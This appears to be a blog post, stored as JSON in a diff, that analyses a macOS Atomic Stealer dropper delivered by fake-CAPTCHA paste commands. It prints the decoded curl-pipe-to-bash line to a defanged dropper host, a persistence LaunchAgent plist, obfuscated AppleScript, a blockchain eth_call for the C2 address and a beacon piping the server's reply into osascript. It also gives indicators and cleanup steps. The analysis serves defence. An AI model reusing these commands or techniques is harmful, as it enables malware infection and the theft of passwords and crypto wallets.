@@ -1,0 +1,146 @@
+{
+    "title": "A macOS backdoor that reads its C2 off the blockchain",
+    "description": "Someone sent me a terminal command disguised as an installer. This walks through taking it apart one layer at a time, down to a final stage that reads its command-and-control address off the Polygon blockchain instead of hardcoding it.",
+    "date": "2026-07-21",
+    "tags": ["security", "malware", "macos", "reverse-engineering"],
+    "content": [
+        {
+            "description": "Someone sent me a command they had been told to paste into their terminal and asked whether it was safe to run. It was presented as an installer. This document walks through how I took it apart, one layer at a time, and what the final payload turned out to do. The last stage was new to me: it reads its command-and-control address off the Polygon blockchain rather than hardcoding it."
+        },
+        {
+            "label": "The command"
+        },
+        {
+            "text": "This is what they were handed. A single line, the sort that turns up behind a fake CAPTCHA or a page telling you to run something to finish an install."
+        },
+        {
+            "codeSnippet": {
+                "type": "bash",
+                "name": "the pasted command",
+                "data": "bash <<< $(echo \"Y3VybCAtcyAnaHR0cHM6Ly9hdXRvYjEuYXNo...\" | base64 -d)"
+            }
+        },
+        {
+            "text": "The outer bash <<< $(...) is a here-string. It decodes the base64 and feeds the result straight into a new shell, so you never get to read what runs before it runs. Rather than execute it, I decoded the base64 on its own."
+        },
+        {
+            "codeSnippet": {
+                "type": "bash",
+                "name": "decoded",
+                "data": "curl -s 'https://autob1.ashleynewsome[.]com/update.sh' | bash"
+            }
+        },
+        {
+            "text": "This is the curl piped into bash pattern. The -s flag keeps curl quiet, and whatever is hosted at that URL runs immediately with the current user's privileges. The contents can be changed at any time, so checking the file once tells you nothing about what it serves next. There is no reason for a real installer to base64-wrap a plain curl call. I did not run it, and I did not fetch that URL from a machine I care about."
+        },
+        {
+            "label": "The installer"
+        },
+        {
+            "text": "Fetching update.sh inside a throwaway VM, it turned out to be an AppleScript installer. Its first job is persistence: it writes a LaunchAgent to disk and loads it."
+        },
+        {
+            "codeSnippet": {
+                "type": "xml",
+                "name": "com.skbqomdhrojjgxuh.plist",
+                "data": "<key>Label</key>\n<string>com.skbqomdhrojjgxuh</string>\n<key>KeepAlive</key>\n<true/>\n<key>RunAtLoad</key>\n<true/>\n<key>ProgramArguments</key>\n<array>\n    <string>/bin/bash</string>\n    <string>-c</string>\n    <string>echo '<base64>' | base64 -d | osascript</string>\n</array>"
+            }
+        },
+        {
+            "text": "RunAtLoad starts the agent at every login. KeepAlive tells macOS to relaunch it if it is ever killed. The random name, skbqomdhrojjgxuh, is there so nothing obvious stands out in Activity Monitor or the LaunchAgents folder. Each time the agent runs, it executes another base64 blob piped into osascript, so there was one more layer to decode."
+        },
+        {
+            "label": "The obfuscated AppleScript"
+        },
+        {
+            "text": "The decoded AppleScript is written to be unreadable. Every meaningful string is assembled one character at a time, so nothing a scanner might match on ever appears as plaintext."
+        },
+        {
+            "codeSnippet": {
+                "type": "applescript",
+                "name": "one string, built character by character",
+                "data": "set _endpoint to (\"pol\" & \"yg\" & \"on\" & (ASCII character 46) & (character id 100) & (character id 114) & (ASCII character 112) & \"c\" & (ASCII character 46) & \"o\" & \"r\" & (ASCII character 103))"
+            }
+        },
+        {
+            "text": "That fragment resolves to polygon.drpc.org. Working through the rest, the script holds three things: a list of four Polygon RPC endpoints, a JSON-RPC request, and a POST it sends afterward. The four endpoints are interchangeable public gateways for the same read."
+        },
+        {
+            "label": "Reading the C2 off the blockchain"
+        },
+        {
+            "text": "This is the part I spent the most time on. The payload does not contain the address of its command-and-control server. Instead it makes a read-only eth_call to a smart contract and asks the contract for the address."
+        },
+        {
+            "codeSnippet": {
+                "type": "json",
+                "name": "eth_call - reading the C2 address off Polygon",
+                "data": "{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"eth_call\",\n  \"params\": [\n    {\n      \"to\": \"0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0\",\n      \"data\": \"0x2686ecea\"\n    },\n    \"latest\"\n  ],\n  \"id\": 1\n}"
+            }
+        },
+        {
+            "text": "It pulls the ABI-encoded hex out of the response, reads the length word, and decodes the data bytes with xxd. What comes back is a plain hostname, the live C2. The technique is called EtherHiding. The consequence is specific: a value stored on a public blockchain cannot be taken down or seized, so there is no domain to sinkhole and no server to raid. When the operator wants to move, they write a new hostname into the contract, and every infected machine picks it up on its next beacon."
+        },
+        {
+            "label": "The final stage"
+        },
+        {
+            "text": "With the address resolved, the last stage POSTs to it and pipes the response straight into osascript."
+        },
+        {
+            "codeSnippet": {
+                "type": "bash",
+                "name": "the beacon",
+                "data": "curl --max-time 20 --retry 3 -X POST hxxps://<address-from-chain> \\\n     -d 'txid=ebbeb3df8cbbb8e590bd31645ecc8cbf&bmodule' | osascript"
+            }
+        },
+        {
+            "text": "The server returns fresh AppleScript on demand, and it runs immediately. The txid is a fixed per-victim tag the operator uses to track a specific infection. Because the payload is fetched live every time, nothing final has to stay on disk, and static analysis of the dropper alone cannot tell you what it ultimately does."
+        },
+        {
+            "text": "I am not reproducing the full script or the live base64 here. The structure above is enough to follow how it works, and the working version points at infrastructure that is still active."
+        },
+        {
+            "label": "What it steals"
+        },
+        {
+            "text": "The behavior places it in the Atomic Stealer (AMOS) family, a macOS infostealer sold as a subscription and distributed through the ClickFix social-engineering campaigns. Two steps stood out."
+        },
+        {
+            "list": [
+                "A fake password prompt. It shows a dialog styled like a normal macOS system request, then checks whatever is typed by running dscl . authonly in a loop, re-prompting until the password authenticates. The confirmed password is written to ~/.passphrase and sent out. That password unlocks the login Keychain.",
+                "Wallet replacement. It targets roughly 25 desktop wallets, kills the running application, overwrites the app bundle with a trojanized copy, and applies an ad-hoc code signature so the replacement launches without a Gatekeeper warning. In this sample it swapped a fake Ledger Wallet.app over the real one to capture the seed phrase."
+            ]
+        },
+        {
+            "label": "How it spreads"
+        },
+        {
+            "text": "Delivery is malvertising paired with a fake CAPTCHA. In the case matching this sample, the victim was searching for a cheap Mac Mini, clicked a sponsored listing, and was shown a fake CAPTCHA that copied the command to the clipboard and told them to paste it into a terminal. Apple added a warning in macOS 26.4 when certain commands are pasted into Terminal; in response, the operators moved to launching Script Editor instead, avoiding Terminal entirely."
+        },
+        {
+            "divider": true
+        },
+        {
+            "label": "Notes"
+        },
+        {
+            "text": "The obfuscation was mechanical - base64, a here-string, then per-character AppleScript - and getting through it was mostly patience. The blockchain C2 is the piece worth keeping. Takedowns usually depend on there being a domain or a server to remove; storing the one value that changes, where to report in, on a public chain removes that option. The defensive version of the same idea is straightforward: the current C2 can be read with the same eth_call the malware makes, against a public RPC, without ever contacting the attacker's infrastructure."
+        },
+        {
+            "smallLabel": "Indicators (defanged)"
+        },
+        {
+            "list": [
+                "LaunchAgent: ~/Library/LaunchAgents/com.skbqomdhrojjgxuh.plist",
+                "Staged payload: ~/Library/skbqomdhrojjgxuh",
+                "Dropper host: autob1.ashleynewsome[.]com",
+                "On-chain C2 store: Polygon contract 0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0, selector 0x2686ecea",
+                "Infection tag: txid ebbeb3df8cbbb8e590bd31645ecc8cbf"
+            ]
+        },
+        {
+            "text": "If a machine may have run this: unload and delete the plist, remove the staged payload, check the LaunchAgents and LaunchDaemons folders for other random-named entries, and, because the goal is credential theft, rotate everything that was signed in on that machine from a separate, clean device. With an active backdoor, a clean reinstall is the only way to be certain."
+        }
+    ]
+}
